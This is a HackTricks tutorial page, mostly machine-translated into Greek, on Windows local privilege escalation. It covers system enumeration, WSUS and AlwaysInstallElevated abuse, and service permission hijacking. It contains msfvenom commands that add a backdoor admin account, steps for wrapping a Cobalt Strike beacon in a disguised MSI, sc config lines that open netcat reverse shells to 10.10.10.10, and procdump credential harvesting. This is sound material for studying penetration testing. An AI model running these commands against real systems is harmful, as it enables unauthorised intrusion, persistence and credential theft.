# Windows Local Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### **Καλύτερο εργαλείο για να αναζητήσετε διανύσματα τοπικής κλιμάκωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική Θεωρία Windows

### Διαπιστευτήρια Πρόσβασης

**Αν δεν γνωρίζετε τι είναι τα Διαπιστευτήρια Πρόσβασης Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Δείτε την παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Επίπεδα Ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, θα πρέπει να διαβάσετε την παρακάτω σελίδα πριν συνεχίσετε:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Έλεγχοι Ασφαλείας Windows

Υπάρχουν διάφορα πράγματα στα Windows που θα μπορούσαν να **σας εμποδίσουν να καταγράψετε το σύστημα**, να εκτελέσετε εκτελέσιμα ή ακόμα και να **ανιχνεύσουν τις δραστηριότητές σας**. Θα πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **καταγράψετε** όλους αυτούς τους **μηχανισμούς** **άμυνας** πριν ξεκινήσετε την καταγραφή κλιμάκωσης προνομίων:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Πληροφορίες Συστήματος

### Καταγραφή πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τις διορθώσεις που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Αυτή η [ιστοσελίδα](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμη για την αναζήτηση λεπτομερών πληροφοριών σχετικά με τις ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων έχει περισσότερες από 4,700 ευπάθειες ασφαλείας, δείχνοντας την **μαζική επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά με πληροφορίες συστήματος**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos των exploits:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Οποιαδήποτε διαπιστευτήρια/ζουμερές πληροφορίες αποθηκεύονται στις μεταβλητές περιβάλλοντος;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Ιστορικό PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Οι λεπτομέρειες των εκτελέσεων της ροής PowerShell καταγράφονται, περιλαμβάνοντας εκτελούμενες εντολές, κλήσεις εντολών και μέρη σεναρίων. Ωστόσο, οι πλήρεις λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου ενδέχεται να μην καταγράφονται.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 γεγονότα από τα αρχεία καταγραφής του PowersShell, μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Ένα πλήρες αρχείο δραστηριότητας και πλήρες περιεχόμενο της εκτέλεσης του script καταγράφεται, διασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα εκτενές ίχνος ελέγχου κάθε δραστηριότητας, πολύτιμο για τη δικαστική ανάλυση και την ανάλυση κακόβουλης συμπεριφοράς. Με την τεκμηρίωση όλων των δραστηριοτήτων τη στιγμή της εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα γεγονότα καταγραφής για το Script Block μπορούν να βρεθούν μέσα στον Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 γεγονότα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα αν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί μια μη SSL ενημέρωση WSUS εκτελώντας το εξής:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Αν λάβετε μια απάντηση όπως:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`.

Then, **είναι εκμεταλλεύσιμο.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## KrbRelayUp

A **τοπική εκμετάλλευση προνομίων** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Εάν** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτή την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε μέσα στον τρέχοντα φάκελο ένα Windows MSI δυαδικό αρχείο για την κλιμάκωση δικαιωμάτων. Αυτό το σενάριο γράφει έναν προcompiled MSI εγκαταστάτη που ζητάει προσθήκη χρήστη/ομάδας (έτσι θα χρειαστείτε πρόσβαση GIU):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο δυαδικό αρχείο για να κλιμακώσετε τα δικαιώματα.

### MSI Wrapper

Διαβάστε αυτό το εγχειρίδιο για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να τυλίξετε ένα "**.bat**" αρχείο αν απλώς θέλετε να εκτελέσετε γραμμές εντολών.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Create MSI with WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Create MSI with Visual Studio

* **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στο `C:\privesc\beacon.exe`
* Ανοίξτε το **Visual Studio**, επιλέξτε **Δημιουργία νέου έργου** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το έργο **Setup Wizard** και κάντε κλικ στο **Επόμενο**.
* Δώστε στο έργο ένα όνομα, όπως **AlwaysPrivesc**, χρησιμοποιήστε **`C:\privesc`** για την τοποθεσία, επιλέξτε **τοποθετήστε τη λύση και το έργο στον ίδιο φάκελο**, και κάντε κλικ στο **Δημιουργία**.
* Συνεχίστε να κάνετε κλικ στο **Επόμενο** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλέξτε αρχεία προς συμπερίληψη). Κάντε κλικ στο **Προσθήκη** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Στη συνέχεια, κάντε κλικ στο **Τέλος**.
* Επισημάνετε το έργο **AlwaysPrivesc** στο **Solution Explorer** και στις **Ιδιότητες**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
* Υπάρχουν άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως ο **Συγγραφέας** και ο **Κατασκευαστής** που μπορούν να κάνουν την εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
* Κάντε δεξί κλικ στο έργο και επιλέξτε **Προβολή > Προσαρμοσμένες Ενέργειες**.
* Κάντε δεξί κλικ στο **Εγκατάσταση** και επιλέξτε **Προσθήκη Προσαρμοσμένης Ενέργειας**.
* Κάντε διπλό κλικ στο **Φάκελο Εφαρμογής**, επιλέξτε το αρχείο **beacon.exe** σας και κάντε κλικ στο **OK**. Αυτό θα διασφαλίσει ότι το beacon payload θα εκτελείται μόλις εκτελείται ο εγκαταστάτης.
* Κάτω από τις **Ιδιότητες Προσαρμοσμένης Ενέργειας**, αλλάξτε το **Run64Bit** σε **True**.
* Τέλος, **κατασκευάστε το**.
* Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι έχετε ρυθμίσει την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always\_install\_elevated_

## Antivirus και Ανιχνευτές

### Ρυθμίσεις Ελέγχου

Αυτές οι ρυθμίσεις αποφασίζουν τι **καταγράφεται**, οπότε θα πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Η Προώθηση Συμβάντων των Windows είναι ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα αρχεία καταγραφής.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των τοπικών κωδικών πρόσβασης διαχειριστή**, διασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι συνδεδεμένοι σε τομέα. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια μέσα στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες που έχουν λάβει επαρκείς άδειες μέσω ACLs, επιτρέποντάς τους να δουν τους τοπικούς κωδικούς πρόσβασης διαχειριστή αν είναι εξουσιοδοτημένοι.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Αν είναι ενεργό, **οι κωδικοί πρόσβασης σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες σχετικά με το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Αρχής γενομένης από το **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Τοπική Αρχή Ασφαλείας (LSA) για να **μπλοκάρει** τις απόπειρες από μη αξιόπιστες διαδικασίες να **διαβάσουν τη μνήμη της** ή να εισάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες σχετικά με την προστασία LSA εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** εισήχθη στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που αποθηκεύονται σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash.| [**Περισσότερες πληροφορίες σχετικά με το Credentials Guard εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Τα διαπιστευτήρια τομέα** πιστοποιούνται από την **Τοπική Αρχή Ασφαλείας** (LSA) και χρησιμοποιούνται από τα συστατικά του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη πιστοποιούνται από ένα καταχωρημένο πακέτο ασφαλείας, τα διαπιστευτήρια τομέα για τον χρήστη συνήθως καθορίζονται.\
[**Περισσότερες πληροφορίες σχετικά με τα Cached Credentials εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Καταμέτρηση Χρηστών & Ομάδων

Πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε έχουν ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Αν **ανήκεις σε κάποια προνομιούχα ομάδα μπορεί να είσαι σε θέση να κλιμακώσεις τα προνόμια**. Μάθε για τις προνομιούχες ομάδες και πώς να τις εκμεταλλευτείς για να κλιμακώσεις τα προνόμια εδώ:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Token manipulation

**Μάθε περισσότερα** για το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
Δες την παρακάτω σελίδα για να **μάθεις για ενδιαφέροντα tokens** και πώς να τα εκμεταλλευτείς:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Φάκελοι αρχικής σελίδας
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Πάρτε το περιεχόμενο του clipboard
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

Πρώτα απ' όλα, καταγράψτε τις διαδικασίες **ελέγξτε για κωδικούς πρόσβασης μέσα στη γραμμή εντολών της διαδικασίας**.\
Ελέγξτε αν μπορείτε να **επικαλύψετε κάποιο εκτελέσιμο που τρέχει** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του εκτελέσιμου για να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Πάντα ελέγξτε για πιθανές [**electron/cef/chromium debuggers** που εκτελούνται, μπορείτε να το εκμεταλλευτείτε για να κερδίσετε δικαιώματα**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των δυαδικών αρχείων των διαδικασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων διεργασιών (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Μπορείτε να δημιουργήσετε μια απόθεση μνήμης μιας εκτελούμενης διαδικασίας χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials σε καθαρό κείμενο στη μνήμη**, προσπαθήστε να αποθηκεύσετε τη μνήμη και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**Εφαρμογές που εκτελούνται ως SYSTEM μπορεί να επιτρέψουν σε έναν χρήστη να ανοίξει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Get a list of services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permissions

Μπορείτε να χρησιμοποιήσετε **sc** για να αποκτήσετε πληροφορίες σχετικά με μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το δυαδικό **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο δικαιωμάτων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Επικυρωμένοι Χρήστες" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Εάν έχετε αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Σφάλμα συστήματος 1058 έχει συμβεί._\
_Η υπηρεσία δεν μπορεί να ξεκινήσει, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν έχει ενεργοποιημένες συσκευές που σχετίζονται με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από το SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** σε αυτό το πρόβλημα είναι η εκτέλεση:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής δυαδικού αρχείου υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE\_ALL\_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου δυαδικού αρχείου της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

* **SERVICE\_CHANGE\_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του δυαδικού αρχείου της υπηρεσίας.
* **WRITE\_DAC**: Ενεργοποιεί την επαναδιαμόρφωση των δικαιωμάτων, οδηγώντας στην ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
* **WRITE\_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την επαναδιαμόρφωση των δικαιωμάτων.
* **GENERIC\_WRITE**: Κληρονομεί την ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
* **GENERIC\_ALL**: Επίσης κληρονομεί την ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service\_permissions_ can be utilized.

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Υπηρεσίες μητρώου τροποποίηση δικαιωμάτων

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε οποιοδήποτε μητρώο υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε ένα **μητρώο** υπηρεσίας κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή οι **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Αν ναι, το δυαδικό αρχείο που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Για να αλλάξετε τη διαδρομή του εκτελούμενου δυαδικού αρχείου:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Υπηρεσίες μητρώου δικαιώματα AppendData/AddSubdirectory

Αν έχετε αυτό το δικαίωμα σε ένα μητρώο, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε υπομητρώα από αυτό**. Στην περίπτωση των υπηρεσιών Windows, αυτό είναι **αρκετό για να εκτελέσετε αυθαίρετο κώδικα:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
